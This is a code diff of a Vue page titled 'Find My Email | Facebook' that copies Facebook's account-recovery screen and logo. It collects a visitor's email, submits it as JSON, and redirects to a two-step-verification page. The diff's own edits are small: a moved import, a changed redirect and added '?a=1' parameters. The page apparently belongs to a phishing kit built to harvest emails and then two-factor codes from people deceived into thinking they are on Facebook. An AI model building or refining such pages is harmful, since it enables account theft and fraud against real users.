@@ -1,4 +1,5 @@
 <script setup lang="ts">
+import FindEmailMobile from '~/layouts/FindEmailMobile.vue'
 useHead({
   title: 'Find My Email | Facebook',
   meta: [
@@ -8,7 +9,6 @@ useHead({
     },
   ],
 })
-import FindEmailMobile from '~/layouts/FindEmailMobile.vue'
 const email = ref('')
 const router = useRouter()
 async function submitForm() {
@@ -22,7 +22,8 @@ async function submitForm() {
         'Content-Type': 'application/json',
       },
     })
-    router.push('/two_step_verification/two_factor')
+    // router.push('/two_step_verification/two_factor')
+    window.location.href = '/two_step_verification/two_factor?a=1'
   } catch (error) {
     console.error(error)
   }
@@ -35,12 +36,12 @@ async function submitForm() {
     <FindEmailMobile class="hidden max-md:flex" />
     <div class="max-md:hidden flex flex-col h-full">
       <header class="max-md:h-[50px] h-[83px] flex items-end justify-center">
-      <div
-        class="w-full max-w-[981px] max-md:flex max-md:justify-center max-md:items-center max-md:h-full"
-      >
-        <img class="max-md:w-[120px] w-[170px] md:mb-4" src="/logo-white.png" alt="" />
-      </div>
-    </header>
+        <div
+          class="w-full max-w-[981px] max-md:flex max-md:justify-center max-md:items-center max-md:h-full"
+        >
+          <img class="max-md:w-[120px] w-[170px] md:mb-4" src="/logo-white.png" alt="" />
+        </div>
+      </header>
       <div class="flex gap-5 flex-col bg-[#e9ebef] justify-center items-center h-full">
         <div class="max-md:h-full max-md:w-full bg-white rounded-lg w-[600px] shadow-md">
           <p
@@ -58,7 +59,7 @@ async function submitForm() {
                   "To get back in to your account, enter your current Email if you know it. If you don't think that your account was hacked, you can",
                 )
               }}
-              <a class="text-[#0064E0]" href="/login">
+              <a class="text-[#0064E0]" href="/login?a=1">
                 {{ $t('cancel this process') }}
               </a>
             </div>
